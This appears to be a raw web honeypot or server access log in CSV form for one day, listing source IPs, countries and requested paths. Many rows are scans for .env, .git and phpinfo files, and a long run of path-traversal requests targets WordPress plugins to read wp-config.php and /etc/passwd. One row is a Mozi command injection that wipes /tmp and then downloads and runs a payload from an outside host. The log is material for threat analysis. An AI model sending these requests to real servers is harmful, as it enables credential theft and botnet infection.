"2025-10-15","123.145.31.181","China","HTTP","/favicon.ico"
"2025-10-15","143.198.131.96","United States","HTTP","/favicon.ico"
"2025-10-15","64.62.156.46","United States","HTTP","http://api.ipify.org/?format=json"
"2025-10-15","64.62.156.38","United States","HTTP","/geoserver/web/"
"2025-10-15","194.163.129.51","France","HTTP","/admin/config.php"
"2025-10-15","24.199.100.206","United States","HTTP","/admin/config.php"
"2025-10-15","79.124.40.174","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-15","195.178.110.201","Bulgaria","HTTP","/.env"
"2025-10-15","195.178.110.201","Bulgaria","HTTP","/.git/HEAD"
"2025-10-15","202.93.142.22","Indonesia","HTTP","/admin/config.php"
"2025-10-15","128.203.201.208","Canada","HTTP","/developmentserver/metadatauploader"
"2025-10-15","79.124.40.174","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-10-15","167.71.32.8","Germany","HTTP","/robots.txt"
"2025-10-15","88.129.1.246","Sweden","HTTP","/shell?cd+/tmp;rm+-rf+*;wget+http://88.129.1.246:44840/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
"2025-10-15","66.132.153.143","United States","HTTP","/login"
"2025-10-15","167.94.146.56","United States","HTTP","/wiki"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-admin/admin-ajax.php?action=kbslider_show_image\u0026img=../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/member/index.php?a=doshow\u0026m=include\u0026c=old_thumb\u0026dir=http/./.../..././/./.../..././/config/config_db.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-admin/admin-ajax.php?+jvfrm_spot_get_json\u0026fn=../../wp-config.php\u0026callback=jQuery"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/include/thumb.php?dir=http\\..\\..\\config\\config_db.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=http://http://108.174.54.75/wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/apptha-slider-gallery/asgallDownload.php?imgname=../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean\u0026file_path=/wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/ungallery/source_editf3.php?pic=../../../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php"
"2025-10-15","204.76.203.18","The Netherlands","HTTP","/bins/"
"2025-10-15","204.76.203.18","The Netherlands","HTTP","/bin/"
"2025-10-15","204.76.203.18","The Netherlands","HTTP","/backup/"
"2025-10-15","213.209.157.162","Germany","HTTP","/.git/index"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php"
"2025-10-15","45.58.127.135","United States","HTTP","/robots.txt"
"2025-10-15","176.65.141.86","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-10-15","162.243.31.168","United States","HTTP","/.env"
"2025-10-15","162.243.31.168","United States","HTTP","/.git/config"
"2025-10-15","195.178.110.201","Bulgaria","HTTP","/.git/refs/"
"2025-10-15","213.209.157.254","Germany","HTTP","/.git/index"
"2025-10-15","45.82.78.113","Germany","HTTP","/favicon.ico"
"2025-10-15","74.82.47.5","United States","HTTP","/favicon.ico"
"2025-10-15","74.82.47.5","United States","HTTP","/geoserver/web/"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/backend/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/api/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/admin/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/?phpinfo=-1"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/app_dev.php/_profiler/phpinfo"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.env.example"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/phpinfo/"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/server/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/phpinfo.php"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/tmp/env.save"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.env.development"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.env.save"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/bot/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/api/v2/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/tmp/.env.pem"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/?url=.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/tmp/.env.old"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/tmp/.env.log"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/test.php"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/application/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.env.prod"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/production/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/dashboard/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/config/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/web/debug/default/view"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.config.yaml"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.json"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/stage/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/crm/.env"
"2025-10-15","204.76.203.30","The Netherlands","HTTP","/.env.testing"
"2025-10-15","199.45.155.80","United States","HTTP","/robots.txt"
"2025-10-15","167.94.138.199","United States","HTTP","/favicon.ico"
"2025-10-15","167.94.138.199","United States","HTTP","/favicon.ico"
"2025-10-15","167.94.138.199","United States","HTTP","/wiki"
"2025-10-15","207.154.226.99","Germany","HTTP","/query?q=SHOW+DIAGNOSTICS"
"2025-10-15","104.248.25.111","Germany","HTTP","/v2/_catalog"
"2025-10-15","165.22.68.200","Germany","HTTP","/solr/admin/info/system"
"2025-10-15","207.154.255.103","Germany","HTTP","/cgi-bin/authLogin.cgi"
"2025-10-15","165.22.68.200","Germany","HTTP","/solr/admin/cores?action=STATUS\u0026wt=json"
"2025-10-15","128.199.178.133","Singapore","HTTP","/favicon.ico"
"2025-10-15","207.154.254.128","Germany","HTTP","/v2/_catalog"
"2025-10-15","209.38.217.244","Germany","HTTP","/cgi-bin/authLogin.cgi"
"2025-10-15","138.197.191.164","Germany","HTTP","/solr/admin/info/system"
"2025-10-15","138.197.191.164","Germany","HTTP","/solr/admin/cores?action=STATUS\u0026wt=json"
"2025-10-15","152.42.234.128","Singapore","HTTP","/favicon.ico"
"2025-10-15","167.99.142.150","Germany","HTTP","/query?q=SHOW+DIAGNOSTICS"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php\u0026info=wp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-admin/admin.php?page=download_report\u0026report=users\u0026status=all"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-admin/admin-ajax.php?action=duplicator_download\u0026file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-admin/admin-ajax.php?action=duplicator_download\u0026file=%2F..%2Fwp-config.php"
"2025-10-15","185.196.9.221","United Kingdom","HTTP","/wp-admin/admin-ajax.php?action=duplicator_download\u0026file=../wp-config.php"
"2025-10-15","135.237.127.190","United States","HTTP","/hudson"
"2025-10-15","167.71.32.8","Germany","HTTP","/robots.txt"
"2025-10-15","170.64.195.66","Australia","HTTP","/download/powershell/"
"2025-10-15","170.64.195.66","Australia","HTTP","/get.php"
"2025-10-15","80.82.77.202","The Netherlands","HTTP","/aaa9"
"2025-10-15","80.82.77.202","The Netherlands","HTTP","/aab9"
"2025-10-15","45.58.127.135","United States","HTTP","/robots.txt"
"2025-10-15","204.76.203.18","The Netherlands","HTTP","/bins/"
"2025-10-15","87.120.191.37","United States","HTTP","http://ip-api.com/json/"
"2025-10-15","24.199.100.206","United States","HTTP","/admin/config.php"
"2025-10-15","79.124.40.174","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-15","165.22.232.83","Canada","HTTP","/form.html"
"2025-10-15","165.22.232.83","Canada","HTTP","/upl.php"
"2025-10-15","165.22.232.83","Canada","HTTP","/t4"
